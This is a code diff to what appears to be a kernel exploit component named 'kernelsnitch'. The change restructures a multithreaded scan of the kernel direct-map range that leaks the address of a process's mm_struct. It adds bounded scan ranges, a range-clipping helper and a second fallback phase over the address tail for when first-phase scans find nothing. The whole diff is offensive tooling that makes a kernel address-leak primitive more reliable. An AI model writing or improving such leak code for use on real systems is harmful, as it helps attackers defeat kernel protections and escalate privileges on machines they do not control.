@@ -308,12 +308,10 @@ namespace ghostlock::kernelsnitch {
     }
 
     static void __run_mm_leak_pass(struct kernelsnitch_shared_state *ks, int32_t try_canonical,
-                                   int32_t sweep_tags, size_t inner, size_t outer) {
+                                   int32_t sweep_tags, size_t inner, size_t outer,
+                                   size_t floor, size_t ceiling, int32_t phase) {
         /* the leak check discards a match past the measured end, so no slice
      * scans past it */
-        const size_t ceiling = static_cast<size_t>(
-                std::min<uint64_t>(ghostlock::kernel::g_direct_map_end,
-                                   static_cast<uint64_t>(IDENTITY_END)));
         struct range ranges[ghostlock::kernel::MAX_DIRECT_MAP_BANKS + 64];
         size_t range_count = 0;
         const char *source = "span";
@@ -323,17 +321,17 @@ namespace ghostlock::kernelsnitch {
                  i < ghostlock::kernel::g_direct_map_bank_count &&
                  range_count < ghostlock::kernel::MAX_DIRECT_MAP_BANKS;
                  ++i) {
-                const size_t start = static_cast<size_t>(std::max<uint64_t>(
-                        ghostlock::kernel::g_direct_map_banks[i].start, IDENTITY_START));
-                const size_t end = static_cast<size_t>(
-                        std::min<uint64_t>(ghostlock::kernel::g_direct_map_banks[i].end,
-                                           ceiling));
-                if (start < end) {
-                    ranges[range_count].id = range_count;
-                    ranges[range_count].start = start;
-                    ranges[range_count].end = end;
-                    ++range_count;
+                ghostlock::kernelsnitch::scan_bounds clipped{};
+                if (!ghostlock::kernelsnitch::clip_scan_range(
+                            ghostlock::kernel::g_direct_map_banks[i].start,
+                            ghostlock::kernel::g_direct_map_banks[i].end, floor, ceiling,
+                            &clipped)) {
+                    continue;
                 }
+                ranges[range_count].id = range_count;
+                ranges[range_count].start = clipped.start;
+                ranges[range_count].end = clipped.end;
+                ++range_count;
             }
             if (range_count == 0)
                 source = "span";
@@ -341,13 +339,11 @@ namespace ghostlock::kernelsnitch {
         if (range_count == 0) {
             /* No usable bank list: split the measured span across the workers.
              * identity_diff is no longer used by the scan; the split is local. */
-            const size_t span = ceiling > IDENTITY_START ? ceiling - IDENTITY_START : 0;
+            const size_t span = ceiling > floor ? ceiling - floor : 0;
             const size_t diff = span / (ks->thread_cnt ? ks->thread_cnt : 1);
             for (size_t i = 0; i < ks->thread_cnt; ++i) {
-                size_t start = IDENTITY_START + diff * i;
-                size_t end = (i + 1 == ks->thread_cnt)
-                                     ? ceiling
-                                     : IDENTITY_START + diff * (i + 1);
+                size_t start = floor + diff * i;
+                size_t end = (i + 1 == ks->thread_cnt) ? ceiling : floor + diff * (i + 1);
                 if ((start % COARSE_SZ) != 0)
                     start = (start & ~(COARSE_SZ - 1));
                 if ((end % COARSE_SZ) != 0)
@@ -362,9 +358,9 @@ namespace ghostlock::kernelsnitch {
                 }
             }
         }
-        pr_info("[kernelsnitch] scan inner=%zu outer=%zu ranges=%zu source=%s "
+        pr_info("[kernelsnitch] scan phase=%d inner=%zu outer=%zu ranges=%zu source=%s "
                 "canonical=%d tags=%d\n",
-                inner, outer, range_count, source, try_canonical, sweep_tags);
+                phase, inner, outer, range_count, source, try_canonical, sweep_tags);
         if (ks->thread_cnt == 0)
             return;
         for (size_t i = 0; i < ks->thread_cnt; ++i) {
@@ -712,14 +708,39 @@ namespace ghostlock::kernelsnitch {
         /* Primary grid: 32 divides every observed family stride (960..1280),
          * so it reaches every object position; the 4 KiB outer step removes
          * the slab-order assumption. S=8 is the universal last resort for a
-         * stride that is not a multiple of 32. */
-        __run_mm_leak_pass(ks, 1, 0, SCAN_PRIMARY_INNER, SCAN_OUTER);
+         * stride that is not a multiple of 32. Phase 1 keeps the built-in
+         * identity ceiling; phase 2 runs the same shapes over the model tail
+         * only when every phase-1 shape missed (the measured span or the
+         * compiled model end extends past the ceiling). */
+        const size_t model_end = static_cast<size_t>(ghostlock::kernel::g_direct_map_end);
+        const size_t phase1_ceiling = ghostlock::kernelsnitch::scan_phase1_ceiling(
+                model_end, static_cast<size_t>(IDENTITY_END));
+        __run_mm_leak_pass(ks, 1, 0, SCAN_PRIMARY_INNER, SCAN_OUTER, IDENTITY_START,
+                           phase1_ceiling, 1);
         if (!ks->found)
-            __run_mm_leak_pass(ks, 0, 1, SCAN_PRIMARY_INNER, SCAN_OUTER);
+            __run_mm_leak_pass(ks, 0, 1, SCAN_PRIMARY_INNER, SCAN_OUTER, IDENTITY_START,
+                               phase1_ceiling, 1);
         if (!ks->found) {
-            __run_mm_leak_pass(ks, 1, 0, SCAN_LAST_RESORT_INNER, SCAN_OUTER);
+            __run_mm_leak_pass(ks, 1, 0, SCAN_LAST_RESORT_INNER, SCAN_OUTER, IDENTITY_START,
+                               phase1_ceiling, 1);
             if (!ks->found)
-                __run_mm_leak_pass(ks, 0, 1, SCAN_LAST_RESORT_INNER, SCAN_OUTER);
+                __run_mm_leak_pass(ks, 0, 1, SCAN_LAST_RESORT_INNER, SCAN_OUTER, IDENTITY_START,
+                                   phase1_ceiling, 1);
+        }
+        if (!ks->found &&
+            ghostlock::kernelsnitch::scan_has_tail(model_end, phase1_ceiling)) {
+            __run_mm_leak_pass(ks, 1, 0, SCAN_PRIMARY_INNER, SCAN_OUTER, phase1_ceiling,
+                               model_end, 2);
+            if (!ks->found)
+                __run_mm_leak_pass(ks, 0, 1, SCAN_PRIMARY_INNER, SCAN_OUTER, phase1_ceiling,
+                                   model_end, 2);
+            if (!ks->found) {
+                __run_mm_leak_pass(ks, 1, 0, SCAN_LAST_RESORT_INNER, SCAN_OUTER,
+                                   phase1_ceiling, model_end, 2);
+                if (!ks->found)
+                    __run_mm_leak_pass(ks, 0, 1, SCAN_LAST_RESORT_INNER, SCAN_OUTER,
+                                       phase1_ceiling, model_end, 2);
+            }
         }
         ks->state = (ks->mm_struct == static_cast<size_t>(-1)) ? KERNELSNITCH_MM_NOT_FOUND : KERNELSNITCH_MM_FOUND;
         return ks->state == KERNELSNITCH_MM_FOUND ? 0 : -1;
